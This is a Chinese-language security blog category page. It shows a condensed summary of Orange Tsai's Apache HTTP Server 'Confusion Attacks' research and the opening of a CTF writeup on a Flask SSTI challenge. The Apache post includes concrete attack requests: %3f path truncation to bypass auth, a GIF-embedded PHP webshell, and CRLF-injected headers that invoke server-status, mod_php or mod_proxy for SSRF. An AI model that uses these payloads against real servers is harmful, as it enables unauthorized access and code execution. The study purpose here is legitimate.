<!doctype html>
<html lang="zh"><head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "nq90i0uzl9");
    </script>
    <!-- Microsoft Clarity ends-->
    <!-- Google tag (gtag.js) begins-->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'AW-16453505124');
    </script>
    <!-- Google tag (gtag.js) ends-->
    <!-- hexo injector head_begin end --><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>分類: Cybersecurity - TriangeSnake&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="TriangeSnake&#039;s Blog"><meta name="msapplication-TileImage" content="/img/trianglesnake.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="TriangeSnake&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="TriangeSnake&#039;s Blog"><meta property="og:url" content="https://trianglesnake.com/"><meta property="og:site_name" content="TriangeSnake&#039;s Blog"><meta property="og:locale" content="zh_TW"><meta property="og:image" content="https://trianglesnake.com/img/og_image.png"><meta property="article:author" content="TriangleSnake"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://trianglesnake.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://trianglesnake.com"},"headline":"TriangeSnake's Blog","image":["https://trianglesnake.com/img/og_image.png"],"author":{"@type":"Person","name":"TriangleSnake"},"publisher":{"@type":"Organization","name":"TriangeSnake's Blog","logo":{"@type":"ImageObject","url":"https://trianglesnake.com/img/triblog.svg"}},"description":""}</script><link rel="icon" href="/img/trianglesnake.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/triblog.svg" alt="TriangeSnake&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/trianglesnake"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜尋" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">分類</a></li><li class="is-active"><a href="#" aria-current="page">Cybersecurity</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-01-01T10:54:15.000Z" title="2025/1/1 下午6:54:15">2025-01-01</time>發表</span><span class="level-item"><time dateTime="2025-01-01T11:00:08.092Z" title="2025/1/1 下午7:00:08">2025-01-01</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a></span><span class="level-item">12 分鐘讀完 (大約1758個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2025/01/01/Confusion-Attacks-Exploiting-Hidden-Semantic-Ambiguity-In-Apache-HTTP-Server-Orange-Tsai/">Confusion Attacks: Exploiting Hidden Semantic Ambiguity In Apache HTTP Server! - Orange Tsai</a></p><div class="content"><blockquote>
<p>Conference: Orange Conference &#x2F; HITCON Conference &#x2F; BlackHat<br>講者：Orange Tsai</p>
</blockquote>
<blockquote>
<p>P.S. 其實 Orange 在 <a target="_blank" rel="noopener" href="https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/#%E7%82%BA%E4%BB%80%E9%BA%BC-apache-http-server-%E8%81%9E%E8%B5%B7%E4%BE%86%E8%87%AD%E8%87%AD%E7%9A%84">DEVCORE 的 Blog</a> 中已經將這幾個漏洞講得很詳細了，這篇算是幫助自己理解之後再濃縮後的版本。</p>
</blockquote>
<hr>
<h2 id="Filename-Confusion"><a href="#Filename-Confusion" class="headerlink" title="Filename Confusion"></a>Filename Confusion</h2><h3 id="截斷攻擊"><a href="#截斷攻擊" class="headerlink" title="截斷攻擊"></a>截斷攻擊</h3><h4 id="mod-rewrite："><a href="#mod-rewrite：" class="headerlink" title="mod_rewrite："></a>mod_rewrite：</h4><p><code>mod_rewrite</code> 中的 <code>RewriteRule</code> 可以塞路徑或網址，但不管用哪個最後都會強制把結果當成網址處理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">apply_rewrite_rule</span><span class="params">(rewriterule_entry *p, rewrite_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ap_regmatch_t</span> regmatch[AP_MAX_REG_MATCH];</span><br><span class="line">    <span class="type">apr_array_header_t</span> *rewriteconds;</span><br><span class="line">    rewritecond_entry *conds;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rewriteconds-&gt;nelts; ++i) &#123;</span><br><span class="line">        rewritecond_entry *c = &amp;conds[i];</span><br><span class="line">        rc = apply_rewrite_cond(c, ctx);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [...] do the remaining stuff</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Now adjust API&#x27;s knowledge about r-&gt;filename and r-&gt;args */</span></span><br><span class="line">    r-&gt;filename = newuri;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;perdir &amp;&amp; (p-&gt;flags &amp; RULEFLAG_DISCARDPATHINFO)) &#123;</span><br><span class="line">        r-&gt;path_info = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    splitout_queryargs(r, p-&gt;flags);         <span class="comment">// &lt;------- [!!!] Truncate the `r-&gt;filename`</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>從上面的程式碼不難看出， <code>RewriteRule</code> 先將 <code>r-&gt;filename</code> 變成 <code>uri</code> ，再把 <code>query</code> 刪掉，看起來蠻合理的，畢竟他是要取 <code>path</code></p>
<p>但這時如果在請求時塞一些 <code>urlencode</code> 後的編碼，就有可能因為後面被截斷從而繞過檢查：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span> <span class="string">&quot;^/user/(.+)$&quot;</span> <span class="string">&quot;/var/user/$1/profile.yml&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果請求長這樣：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/user/orange%2fsecret.yml%3f</span><br></pre></td></tr></table></figure>

<ul>
<li><code>parser</code> 出來的路徑 -&gt; &#x2F;user&#x2F;orange%2fsecret.yml%3f</li>
<li><code>mod_rewrite</code> -&gt; &#x2F;user&#x2F;orange&#x2F;secret.yml?profile.yml -&gt;  &#x2F;user&#x2F;orange&#x2F;secret.yml（ <code>query</code> 的部分會被刪掉）</li>
</ul>
<p>到 <code>mod_rewrite</code> 時，因為 <code>r-&gt;filename</code> ?後面都被刪除的關係，路徑會變成 <code>/var/user/orange/secret.yml</code> ，導致 information leak</p>
<p>除了讀取敏感文件，強制解析成 <code>url</code> 的特性讓攻擊者可以透過 <code>%3f</code> 截斷，導致 <code>url parser</code> 和 apache 的 <code>mod</code> 前後解釋不一致，從而濫用 <code>mod</code> 的各種功能，例如：</p>
<p>本應將 <code>.php</code> 結尾的檔案解析成 php 的 rewrite rule 可由 path 的 <code>%3f</code> 繞過</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span>  ^(.+\.php)$  $<span class="number">1</span> <span class="meta"> [H=application/x-httpd-php]</span></span><br></pre></td></tr></table></figure>

<p>惡意請求：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/server/upload/1.gif%3f.php</span><br><span class="line"><span class="comment">#1.gif:GIF89a&lt;?=system($_GET[&#x27;cmd&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>parser</code> 出來的路徑 -&gt; upload&#x2F;1.gif%3f.php</li>
<li><code>mod_rewrite</code> -&gt; upload&#x2F;1.gif?.php -&gt; upload&#x2F;1.gif 並且符合 regex ，所以會將 1.gif 作為 php 解析，成功執行 webshell</li>
</ul>
<h3 id="ACL-Bypass"><a href="#ACL-Bypass" class="headerlink" title="ACL Bypass"></a>ACL Bypass</h3><h4 id="mod-proxy"><a href="#mod-proxy" class="headerlink" title="mod_proxy:"></a>mod_proxy:</h4><p><code>mod_proxy</code> 會將 <code>r-&gt;filename</code> 解析成 url ，但大多數的模組不會做這種事，模組之間的解釋不一就有機會繞過驗證，導致 <code>BAC</code>，例如：</p>
<p>存取 <code>admin.php</code> 時透過 <code>Files</code> 對其進行身份驗證：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files <span class="string">&quot;admin.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">AuthType</span> Basic </span><br><span class="line">    <span class="attribute">AuthName</span> <span class="string">&quot;Admin Panel&quot;</span></span><br><span class="line">    <span class="attribute">AuthUserFile</span> <span class="string">&quot;/etc/apache2/.htpasswd&quot;</span></span><br><span class="line">    <span class="attribute">Require</span> valid-user</span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>

<p>惡意請求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/admin.php%3f.php</span><br></pre></td></tr></table></figure>

<ul>
<li><code>parser</code> 出來的路徑 -&gt; admin.php%3f.php -&gt; 很明顯和 <code>admin.php</code> 不符，不需要驗證，又結尾是 <code>.php</code> ，因此透過 <code>SㄍetHandler</code> 將後續動作轉交由 <code>mod_proxy</code> 處理</li>
<li><code>mod_proxy</code> -&gt; admin.php?.php -&gt; ?.php 被當成 <code>query</code> 處理，成功存取 <code>admin.php</code></li>
</ul>
<h2 id="DocumentRoot-Confusion"><a href="#DocumentRoot-Confusion" class="headerlink" title="DocumentRoot Confusion"></a>DocumentRoot Confusion</h2><h3 id="任意程式碼洩漏"><a href="#任意程式碼洩漏" class="headerlink" title="任意程式碼洩漏"></a>任意程式碼洩漏</h3><h4 id="RewriteRule"><a href="#RewriteRule" class="headerlink" title="RewriteRule"></a>RewriteRule</h4><p>又是你，這邊有一個先備知識，那就是 <code>RewriteRule</code> 會先嘗試存取 <code>DocumentRoot</code> 下面的路徑，再嘗試使用絕對路徑存取檔案。<br>因此，假設今天要把所有對於 &#x2F;html&#x2F; 中的請求都加上後綴 <code>.html</code> ，可能會這樣寫：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^/html/(.*)$&quot;</span>  <span class="string">&quot;/$1.html&quot;</span></span><br></pre></td></tr></table></figure>

<p>那我們就有可能用剛剛學會那招 <code>%3f</code> 直接把後綴蓋掉，從而存取伺服器中的任何原始碼：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/html/usr/lib/cgi-bin/download.cgi%3f</span><br></pre></td></tr></table></figure>

<ul>
<li><code>parser</code> 出來的路徑 -&gt; &#x2F;html&#x2F;usr&#x2F;lib&#x2F;cgi-bin&#x2F;download.cgi%3f</li>
<li><code>mod_rewrite</code> -&gt; &#x2F;html&#x2F;usr&#x2F;lib&#x2F;cgi-bin&#x2F;download.cgi?.html -&gt; &#x2F;html&#x2F;usr&#x2F;lib&#x2F;cgi-bin&#x2F;download.cgi（ <code>query</code> 的部分會被刪掉）</li>
</ul>
<p>這時就可以 leak 出任意原始碼了</p>
<h4 id="Local-Gadgets-Manipulation"><a href="#Local-Gadgets-Manipulation" class="headerlink" title="Local Gadgets Manipulation"></a>Local Gadgets Manipulation</h4><p>預設 apache 會阻擋除了 <code>DocumentRoot</code> 底下的所有存取，而 <code>Debian/Ubuntu</code> 的 <code>Httpd</code> 會預設允許 &#x2F;usr&#x2F;share 的存取</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /usr/share&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以其實並不是所有檔案都可以存取，如何利用 &#x2F;usr&#x2F;share 下面的東西變成了主要的問題（Orange 提出各種濫用預設存在 &#x2F;usr&#x2F;share 底下的各種程式碼範本，這邊就不一一贅述）</p>
<h2 id="Handler-Confusion"><a href="#Handler-Confusion" class="headerlink" title="Handler Confusion"></a>Handler Confusion</h2><blockquote>
<p>在正常的流程中瀏覽 <a target="_blank" rel="noopener" href="http://server/config.php%E3%80%82">http://server/config.php。</a> 首先，mod_mime 會在 type_checker 階段根據 AddType 所設定的附檔名將相對應的內容複製到 r-&gt;content_type 中，由於 r-&gt;handler 在整個 HTTP 生命週期中並無賦值，於是在執行模組處理器前 ap_invoke_handler() 會將 r-&gt;content_type 當成模組處理器，最終呼叫 mod_php 處理請求。</p>
</blockquote>
<p>如果可以控制 Response Header 的 <code>Content-Type</code> 欄位，就可以呼叫任何 <code>mod</code> 處理請求，但是問題是什麼呢？問題是需要在執行到 <code>ap_invoke_handler()</code> 前把 <code>r-&gt;content_type</code> 覆蓋掉，上面有提到 <code>ap_invoke_handler</code> 會在 type_checker 階段被複製進去，而能夠修改 <code>Content-Type</code> 的地方又全都在這之後，因此直接改 <code>Content-Type</code> 是沒有用的</p>
<p>那要如何利用呢？</p>
<p>在 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc3875">RFC 3875</a> 中，規定了 CGI 的 Local Redirect Response 行為：</p>
<blockquote>
<p>The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.</p>
</blockquote>
<p>細看 <code>ap_internal_redirect_handler()</code> 的轉址實作可以發現：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">AP_DECLARE(<span class="type">void</span>) ap_internal_redirect_handler(<span class="type">const</span> <span class="type">char</span> *new_uri, request_rec *r)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> access_status;</span><br><span class="line">    request_rec *new = internal_internal_redirect(new_uri, r);    <span class="comment">// &lt;------ [1]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ap_die was already called, if an error occured */</span></span><br><span class="line">    <span class="keyword">if</span> (!new) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r-&gt;handler)</span><br><span class="line">        ap_set_content_type(new, r-&gt;content_type);                <span class="comment">// &lt;------ [2]</span></span><br><span class="line">    access_status = ap_process_request_internal(new);             <span class="comment">// &lt;------ [3]</span></span><br><span class="line">    <span class="keyword">if</span> (access_status == OK) &#123;</span><br><span class="line">        access_status = ap_invoke_handler(new);                   <span class="comment">// &lt;------ [4]</span></span><br><span class="line">    &#125;</span><br><span class="line">    ap_die(access_status, new);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Httpd 會先設定 <code>Content-Type</code> ，並在後面呼叫我們心心念念的 <code>ap_invoke_handler()</code> ，這不就是我們要達到的效果嗎<br>那什麼狀況下會由伺服器端處理轉址並跳到 <code>ap_internal_redirect_handler()</code> 呢？<br>我們可以在 <code>mod_cgi</code> 的實作中找到答案：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (location &amp;&amp; location[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; r-&gt;status == <span class="number">200</span>) &#123;          <span class="comment">// &lt;------ [2]</span></span><br><span class="line">       <span class="comment">/* This redirect needs to be a GET no matter what the original</span></span><br><span class="line"><span class="comment">        * method was.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       r-&gt;method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">       r-&gt;method_number = M_GET;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* We already read the message body (if any), so don&#x27;t allow</span></span><br><span class="line"><span class="comment">        * the redirected request to think it has one.  We can ignore</span></span><br><span class="line"><span class="comment">        * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       apr_table_unset(r-&gt;headers_in, <span class="string">&quot;Content-Length&quot;</span>);</span><br><span class="line"></span><br><span class="line">       ap_internal_redirect_handler(location, r);                     <span class="comment">// &lt;------ [3]</span></span><br><span class="line">       <span class="keyword">return</span> OK;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>如果回傳的 Status 是 200 以及 Location 標頭欄位是 &#x2F; 開頭則 <code>mod_cgi</code> 便會把這個回應當成一個伺服器端的轉址並開始處理，因此，如果我們可以控制回應標頭（例如 CRLF Injection or SSRF 之類的漏洞），便可以呼叫任意模組</p>
<h4 id="Arbitrary-Handler-to-Information-Disclosure"><a href="#Arbitrary-Handler-to-Information-Disclosure" class="headerlink" title="Arbitrary Handler to Information Disclosure"></a>Arbitrary Handler to Information Disclosure</h4><p>透過 <code>mod_status</code> 達到 information leak：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://server/cgi-bin/redir.cgi?r=http:// %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line"><span class="attribute">Location</span>:/ooo %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line"><span class="attribute">Content</span>-Type:server-status %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">%<span class="attribute">0d</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h4 id="Arbitrary-Handler-to-Misinterpret-Scripts"><a href="#Arbitrary-Handler-to-Misinterpret-Scripts" class="headerlink" title="Arbitrary Handler to Misinterpret Scripts"></a>Arbitrary Handler to Misinterpret Scripts</h4><p>透過 <code>mod_php</code> 強制將任意檔案解析成 php：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://server/cgi-bin/redir.cgi?r=http:// %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line"><span class="attribute">Location</span>:/uploads/avatar.webp %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line"><span class="attribute">Content</span>-Type:application/x-httpd-php %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">%<span class="attribute">0d</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h4 id="Arbitrary-Handler-to-Full-SSRF"><a href="#Arbitrary-Handler-to-Full-SSRF" class="headerlink" title="Arbitrary Handler to Full SSRF"></a>Arbitrary Handler to Full SSRF</h4><p>呼叫 <code>mod_proxy</code> 存取任何協議以及任意網址：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://server/cgi-bin/redir.cgi?r=http:// %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line"><span class="attribute">Location</span>:/ooo %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line"><span class="attribute">Content</span>-Type:proxy:http://example.com/%<span class="number">3</span>f %<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">%<span class="attribute">0d</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-12-07T11:30:27.000Z" title="2024/12/7 下午7:30:27">2024-12-07</time>發表</span><span class="level-item"><time dateTime="2024-12-07T14:04:45.508Z" title="2024/12/7 下午10:04:45">2024-12-07</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">13 分鐘讀完 (大約1955個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/12/07/2024-CGGC-CTF-Final-Writeup/">2024 CGGC CTF Final Writeup</a></p><div class="content"><p>這次幫國網中心的CGGC 網路守護者挑戰賽出題，總共出了兩題 medium ，分別是 <code>web</code> 的 <code>Converter</code> 和 <code>misc</code> 的 <code>cat flag</code></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h2><p>這是一個編碼的網站，可以編碼和解碼 <code>base16</code> &#x2F; <code>base32</code> &#x2F; <code>base64</code> &#x2F; <code>base85</code> 等不同網站<br>後端是使用 <code>Flask</code> 寫的，為了防止 <code>SSTI</code> ，在 <code>render_template_string</code> 之前我把一些地方 <code>HTML encode</code> 了</p>
<p><code>encode</code> 時 <code>input</code> 會被 <code>HTML encode</code><br><code>decode</code> 時 <code>input</code> 和 <code>result</code> 都會被 <code>HTML encode</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(</span><br><span class="line">    RESULT_TEMPLATE.<span class="built_in">format</span>(</span><br><span class="line">    input_data=data, <span class="comment"># 皆會被 HTMLencode</span></span><br><span class="line">    conversion_type=conversion_type,</span><br><span class="line">    action=action,</span><br><span class="line">    result=result <span class="comment"># 只有 decode 時會被 HTMLencode</span></span><br><span class="line">))</span><br></pre></td></tr></table></figure>

<p>因此，想要 SSTI 就只剩下把東西拿去 encode 之後變成怪怪的東西了，那什麼狀況下 encode 會跑出怪怪的東西呢？其實去查一下四種編碼應該就可以很快發現 base85 的 index table 有可以利用的東西（<code>&#123;</code> 和 <code>&#125;</code>），但這樣其實還是不夠的，因為如果想要構造出 <code>&#123;&#125;</code> 那 <code>input</code> 會需要傳入不存在的字元，偏偏 <code>URL encoding</code> 又只會解碼特定的 <code>binary data</code>。</p>
<p>那怎麼辦呢，其實在 <code>encoding</code> 的時候還有第二個可控的地方，那就是 <code>Accept-Charset</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">encoding = request.headers.get(<span class="string">&#x27;Accept-Charset&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;utf&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;latin&#x27;</span>,<span class="string">&#x27;windows&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>]:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> encoding:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported encoding&quot;</span>&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>後端會根據輸入的 <code>charset</code> 去將傳入的資料 <code>encode</code> (但是僅限比較常見系列的編碼)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> conversion_type == <span class="string">&quot;base85&quot;</span>:</span><br><span class="line">    result = base64.b85encode(data.encode(encoding)).decode(encoding)</span><br></pre></td></tr></table></figure>

